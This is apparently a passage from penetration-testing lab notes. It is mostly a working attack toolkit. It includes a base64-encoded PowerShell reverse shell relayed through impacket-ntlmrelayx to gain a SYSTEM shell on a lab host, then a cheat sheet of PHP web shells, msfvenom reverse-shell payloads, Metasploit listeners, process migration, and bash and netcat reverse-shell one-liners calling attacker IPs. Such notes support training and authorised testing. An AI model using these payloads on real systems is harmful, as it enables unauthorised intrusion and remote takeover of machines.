+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgAzACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+
+
+# Bse64 Encode
+
+┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ echo -n &amp;#39;$client = New-Object System.Net.Sockets.TCPClient(&amp;#39;192.168.45.163&amp;#39;,9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex &amp;quot;. { $data } 2&amp;gt;&amp;amp;1&amp;quot; | Out-String ); $sendback2 = $sendback + &amp;#39;PS &amp;#39; + (pwd).Path + &amp;#39;&amp;gt; &amp;#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&amp;#39; | base64
+JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgxOTIuMTY4
+LjQ1LjE2Myw5OTk5KTskc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVtdXSRieXRl
+cyA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJHN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5
+dGVzLkxlbmd0aCkpIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVt
+LlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRieXRlcywwLCAkaSk7JHNlbmRiYWNrID0g
+KGlleCAiLiB7ICRkYXRhIH0gMj4mMSIgfCBPdXQtU3RyaW5nICk7ICRzZW5kYmFjazIgPSAkc2Vu
+ZGJhY2sgKyBQUyAgKyAocHdkKS5QYXRoICsg
+
+# Setup NTLM Relay
+
+┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.201.242 -c &amp;quot;powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgAzACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC &amp;lt;....
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client RPC loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+
+[*] Servers started, waiting for connections
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Next we need a Netcat listener to catch the reverse shell.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~]
+└─$ nc -lnvp 9999
+listening on [any] 9999 ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With everything setup we can modify the Backup directory path.&lt;/p&gt;
+&lt;p&gt;Set the path to the URI reference &lt;code&gt;//192.168.45.163/test&lt;/code&gt; where the IP is our Kali machine and &lt;code&gt;/test&lt;/code&gt; is a nonexistent path.
+&lt;img src=&quot;assets/static/resources/156b67d1d13a6a7b87d4587904efcffa.png&quot; alt=&quot;156b67d1d13a6a7b87d4587904efcffa.png&quot;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Once entered scroll down and click Save.&lt;ul&gt;
+&lt;li&gt;This causes the WP plugin to auth to our &lt;code&gt;impacket-ntlmrelayx&lt;/code&gt; in the context of the user running WP.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;[*] Authenticating against smb://192.168.201.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
+...
+[*] SMBD-Thread-33 (process_request_thread): Connection from 192.168.201.242 controlled, but there are no more targets left!
+[*] Executed specified command on host: 192.168.201.242
+[-] SMB SessionError: STATUS_SHARING_VIOLATION(A file cannot be opened because the share access flags are incompatible.)
+[*] Stopping service RemoteRegistry
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;This confirms our 2 assumptions.&lt;ul&gt;
+&lt;li&gt;INTERNALSRV1/ADMINISTRATOR was used to perform auth.&lt;/li&gt;
+&lt;li&gt;Auth to MAILSRV1 succeeds, indicating the same password is used on both local admin accounts.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The realyed command was executed on MAILSRV1, our Netcat listener caught a shell!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~]
+└─$ nc -lnvp 9999
+listening on [any] 9999 ...
+connect to [192.168.45.163] from (UNKNOWN) [192.168.201.242] 53368
+
+PS C:\Windows\system32&amp;gt; whoami
+nt authority\system
+PS C:\Windows\system32&amp;gt; hostname
+MAILSRV1
+PS C:\Windows\system32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We have obtained code execution as NT AUTHORITY\SYSTEM by authenticating as local admin on MAILSRV1.&lt;ul&gt;
+&lt;li&gt;Achieved by relaying an auth attempt from WP plugin on INTERNALSRV1.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Shells&lt;/h3&gt;
+&lt;h4&gt;Resources&lt;/h4&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/0dayCTF/reverse-shell-generator&quot;&gt;https://github.com/0dayCTF/reverse-shell-generator&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md&quot;&gt;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings&quot;&gt;https://github.com/swisskyrepo/PayloadsAllTheThings&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://medium.com/@PenTest_duck/offensive-netcat-ncat-from-port-scanning-to-bind-shell-ip-whitelisting-834689b103da&quot;&gt;https://medium.com/@PenTest_duck/offensive-netcat-ncat-from-port-scanning-to-bind-shell-ip-whitelisting-834689b103da&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://nmap.org/ncat/guide/index.html&quot;&gt;https://nmap.org/ncat/guide/index.html&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h4&gt;Enumeration&lt;/h4&gt;
+&lt;h5&gt;Web Servers&lt;/h5&gt;
+&lt;p&gt;Always start with Nmap...&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo nmap -v -O -sV -p 1-65535 192.168.X.X
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Check out service versions with &lt;code&gt;searchsploit&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Inspect result with &lt;code&gt;searchsploit -x XXXX&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Clone to pwd with &lt;code&gt;searchsploit -m XXXX&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Search scripts with &lt;code&gt;nmap --script-help &amp;quot;*&amp;quot; | less&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Follow up with &lt;code&gt;--script&lt;/code&gt; scans on relevant services.
+And then Gobuster &lt;em&gt;(Especially helpful for IIS servers)&lt;/em&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/]
+└─$ gobuster dir -x .pdf,.txt,.php -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt --url http://192.168.206.199
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Add a &lt;code&gt;-x&lt;/code&gt; to seach for common file extensions.&lt;ul&gt;
+&lt;li&gt;Example: &lt;code&gt;-x .pdf,.txt,.php&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h4&gt;Encoding&lt;/h4&gt;
+&lt;h5&gt;Base64&lt;/h5&gt;
+&lt;h6&gt;Bash&lt;/h6&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec]
+└─$ echo -n &amp;quot;test@supermagicorg.com&amp;quot; | base64
+dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==
+
+┌──(operator㉿labhost)-[~/OffSec]
+└─$ echo -n &amp;quot;test&amp;quot; | base64
+dGVzdA==
+
+┌──(operator㉿labhost)-[~/OffSec/]
+└─$ echo &amp;quot;VXNlcm5hbWU6&amp;quot; | base64 -d -                  
+Username:                                                                             
+┌──(operator㉿labhost)-[~/OffSec/]
+└─$ echo &amp;quot;UGFzc3dvcmQ6&amp;quot; | base64 -d -
+Password:   
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6&gt;NodeJS&lt;/h6&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/]
+└─$ nodejs
+Welcome to Node.js v18.13.0.
+Type &amp;quot;.help&amp;quot; for more information.
+&amp;gt; btoa(&amp;#39;test@supermagicorg.com&amp;#39;)
+&amp;#39;dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==&amp;#39;
+&amp;gt; btoa(&amp;#39;test&amp;#39;)
+&amp;#39;dGVzdA==&amp;#39;
+&amp;gt; atob(&amp;#39;VXNlcm5hbWU6&amp;#39;)
+&amp;#39;Username:&amp;#39;
+&amp;gt; atob(&amp;#39;UGFzc3dvcmQ6&amp;#39;)
+&amp;#39;Password:&amp;#39; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;h4&gt;Email Server CLI Interactions&lt;/h4&gt;
+&lt;h5&gt;Telnet&lt;/h5&gt;
+&lt;h6&gt;Send Mail&lt;/h6&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;telnet 192.168.206.199 587&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;SMTPD submission port connection.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;EHLO smtp.supermagicorg.com&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Initiate interaction, server replies;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;250-ADMIN&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;250-SIZE 20480000&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;250-AUTH LOGIN&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;250 HELP&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;AUTH LOGIN&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Initiate login, server replies;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;334 VXNlcm5hbWU6&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Base64: &lt;code&gt;Username:&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Send base64 enc email address, server replies;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;334 UGFzc3dvcmQ6&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Base64: &lt;code&gt;Password:&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;dGVzdA==&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Send base64 enc password, server replies;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;235 authenticated.&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;MAIL FROM: test@supermagicorg.com&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Set sender, server replies;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;250 OK&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;RCPT TO: dave.wizard@supermagicorg.com&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Set recipient, server replies;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;250 OK&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;DATA&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Message data, server replies;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;354 OK, send.&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Subject: test&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Set subject.&lt;ul&gt;
+&lt;li&gt;(Press Enter Again)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Test test.&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Message body.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;.&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Send message.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;QUIT&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Close connection, sever replies;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;221 goodbye&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;See Appendix A.1 for Bash script example&lt;/em&gt;&lt;/p&gt;
+&lt;h6&gt;Read Mail&lt;/h6&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec]
+└─$ telnet 192.168.206.199 110
+Trying 192.168.206.199...
+Connected to 192.168.206.199.
+Escape character is &amp;#39;^]&amp;#39;.
++OK POP3
+user test@supermagicorg.com
++OK Send your password
+pass test
++OK Mailbox locked and ready
+list
++OK 1 messages (1725 octets)
+1 1725
+.
+retr 1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;h4&gt;Web Shells&lt;/h4&gt;
+&lt;h5&gt;PHP&lt;/h5&gt;
+&lt;h6&gt;One-liners&lt;/h6&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;
+
+&amp;lt;?php echo passthru($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;
+
+&amp;lt;?php echo exec($_POST[&amp;#39;cmd&amp;#39;]); ?&amp;gt;
+
+&amp;lt;?php passthru($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;h4&gt;General Purpose Reverse Shell Listeners&lt;/h4&gt;
+&lt;h5&gt;Linux&lt;/h5&gt;
+&lt;h6&gt;Netcat&lt;/h6&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nc -nvlp 4444
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;Metasploit Console Reverse TCP Listener One-Liner&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;msfconsole -x &amp;quot;use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.195;set LPORT 443;run;&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;h4&gt;Useful Reverse Shell Payloads&lt;/h4&gt;
+&lt;h5&gt;MsfVenom&lt;/h5&gt;
+&lt;p&gt;List payloads.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msfvenom -l payloads --platform windows --arch x64
+`
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;List payload options.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msfvenom --platform windows --arch x64 -p windows/x64/meterpreter_reverse_https --list-options
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Win x64 single stage reverse TCP.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o nonstaged.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Win x64 staged reverse TCP.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o staged.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;PHP reverse shell.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msfvenom -p php/reverse_php LHOST=192.168.45.182 LPORT=443 --platform php -o webrevshell.php
+`
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Win x64 reverse HTTPS.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.182 LPORT=443 -f exe -o met.exe
+`
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;em&gt;HTTPS Basic Options&lt;/em&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Name        Current Setting  Required  Description
+----        ---------------  --------  -----------
+EXITFUNC    process          yes       Exit technique (Accepted: &amp;#39;&amp;#39;, seh, thread, process
+                                       , none)
+EXTENSIONS                   no        Comma-separate list of extensions to load
+EXTINIT                      no        Initialization strings for extensions
+LHOST                        yes       The local listener hostname
+LPORT       8443             yes       The local listener port
+LURI                         no        The HTTP Path
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6&gt;multi/handler&lt;/h6&gt;
+&lt;p&gt;From msfconsole.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msf6 &amp;gt; use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &amp;gt; set payload windows/x64/shell/reverse_tcp
+payload =&amp;gt; windows/x64/shell/reverse_tcp
+msf6 exploit(multi/handler) &amp;gt; show options
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;From local shell.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msfconsole -x &amp;quot;use exploit/multi/handler;set payload windows/x64/shell_reverse_tcp;set LHOST 192.168.45.240;set LPORT 443;run;&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6&gt;Migrate&lt;/h6&gt;
+&lt;p&gt;Create hidden notepad process and migrate into it.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; execute -H -f notepad
+Process 5256 created.
+meterpreter &amp;gt; migrate 5256
+[*] Migrating from 2500 to 5256...
+[*] Migration completed successfully.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;Linux&lt;/h5&gt;
+&lt;h6&gt;URL Encode with CURL&lt;/h6&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl \
+    --data-urlencode &amp;quot;paramName=value&amp;quot; \
+    --data-urlencode &amp;quot;secondParam=value&amp;quot; \
+    http://example.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6&gt;Bash&lt;/h6&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#39;/usr/bin/bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.45.223/4444 0&amp;gt;&amp;amp;1&amp;quot;&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6&gt;Netcat&lt;/h6&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#39;nc 192.168.45.223 4444 -e /usr/bin/bash&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;Win&lt;/h5&gt;
+&lt;h6&gt;Powershell base64 encoded one-liner&lt;/h6&gt;
+&lt;pre&gt;&lt;code&gt;--- PS On Attacker ---
+
+┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
+└─PS&amp;gt; $Text = &amp;#39;$client = New-Object System.Net.Sockets.TCPClient(&amp;quot;192.168.45.223&amp;quot;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &amp;quot;PS &amp;quot; + (pwd).Path + &amp;quot;&amp;gt; &amp;quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&amp;#39;
+
+┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
+└─PS&amp;gt; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+
+┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
+└─PS&amp;gt; $EncodedText =[Convert]::ToBase64String($Bytes)
+
+┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
+└─PS&amp;gt; $EncodedText
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+
+--- PS END ---
+
+
+# To exec on target (Great for web-shell upgrades or SQLi os commands)
+
+powershell -enc JABjAGwAaQBlAG4A...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;Useful Commands Once Shelled&lt;/h4&gt;
+&lt;h5&gt;Linux&lt;/h5&gt;
+&lt;h6&gt;Seach files from shell&lt;/h6&gt;
+&lt;pre&gt;&lt;code&gt;find /path/to/search -name &amp;#39;file.txt&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6&gt;Recieve file transfer via Ncat listener &lt;em&gt;(Windows A.1)&lt;/em&gt;&lt;/h6&gt;
